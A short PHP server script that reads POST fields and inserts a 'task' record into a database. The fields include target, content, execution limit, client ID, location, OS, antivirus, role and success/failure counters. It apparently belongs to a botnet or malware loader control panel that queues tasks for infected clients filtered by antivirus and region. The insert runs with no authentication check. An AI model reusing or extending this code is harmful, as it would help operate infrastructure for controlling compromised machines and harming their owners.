<?php
include('db.php');

addTask(formatParams(), $pdo);

function formatParams() {
	$params = array();
	if ($_POST['title']) { $params['title'] = $_POST['title']; }
	if ($_POST['type']) { $params['type'] = $_POST['type']; }
	if ($_POST['content']) { $params['content'] = $_POST['content']; }
	if ($_POST['target']) { $params['target'] = $_POST['target']; }
	if ($_POST['trigger']) { $params['trigger'] = $_POST['trigger']; }
	
	if ($_POST['limit']) { $params['limit'] = $_POST['limit']; } else { $params['limit'] = -1; }
	if ($_POST['client_id']) { $params['client_id'] = $_POST['client_id']; } else { $params['client_id'] = '-1'; }
	if ($_POST['location']) { $params['location'] = $_POST['location']; } else { $params['location'] = '-1'; }
	if ($_POST['os']) { $params['os'] = $_POST['os']; } else { $params['os'] = '-1'; }
	if ($_POST['role']) { $params['role'] = $_POST['role']; }
	if ($_POST['antivirus']) { $params['antivirus'] = $_POST['antivirus']; } else {$params['antivirus'] = '-1'; }
	
	// Add CPU and RAM
	$params['cpu'] = '-1';
	$params['ram'] = '-1';
	
	if ($_POST['storage']) {
		$params['storage_type'] = $_POST['storage_type'];
		$params['storage'] = $_POST['storage'];
	} else {
		$params['storage_type'] = '-1';
		$params['storage'] = '-1';
	}
	if ($_POST['network']) {
		$params['network_type'] = $_POST['network_type'];
		$params['network'] = $_POST['network'];
	} else {
		$params['network_type'] = '-1';
		$params['network'] = '-1';
	}
	if ($_POST['status']) { $params['status'] = $_POST['status']; }
	$params['total_done'] = 0;
	$params['total_failed'] = 0;
	
	date_default_timezone_set('Europe/Moscow');
	$params['added'] = date('Y-m-d H:i:s');
	
	return $params;
}

function addTask($params, $pdo) {
	$stmt = $pdo->prepare("INSERT INTO tasks (`title`, `type`, `content`, `target`, `limit`, `client_id`, `location`, `os`, `antivirus`, `cpu`, `ram`, `role`, `storage_type`, `storage`, `network_type`, `network`, `trigger`, `status`, `total_done`, `total_failed`, `added`) VALUES (:title, :type, :content, :target, :limit, :client_id, :location, :os, :antivirus, :cpu, :ram, :role, :storage_type, :storage, :network_type, :network, :trigger, :status, :total_done, :total_failed, :added)");
	$stmt->bindParam(':title', $params['title']);
	$stmt->bindParam(':type', $params['type']);
	$stmt->bindParam(':content', $params['content']);
	$stmt->bindParam(':target', $params['target']);
	$stmt->bindParam(':limit', $params['limit']);
	$stmt->bindParam(':client_id', $params['client_id']);
	$stmt->bindParam(':target', $params['target']);
	$stmt->bindParam(':location', $params['location']);
	$stmt->bindParam(':os', $params['os']);
	$stmt->bindParam(':antivirus', $params['antivirus']);
	$stmt->bindParam(':cpu', $params['cpu']);
	$stmt->bindParam(':ram', $params['ram']);
	$stmt->bindParam(':role', $params['role']);
	$stmt->bindParam(':storage_type', $params['storage_type']);
	$stmt->bindParam(':storage', $params['storage']);
	$stmt->bindParam(':network_type', $params['network_type']);
	$stmt->bindParam(':network', $params['network']);
	$stmt->bindParam(':trigger', $params['trigger']);
	$stmt->bindParam(':status', $params['status']);
	$stmt->bindParam(':total_done', $params['total_done']);
	$stmt->bindParam(':total_failed', $params['total_failed']);
	$stmt->bindParam(':added', $params['added']);
	$stmt->execute();
}
?>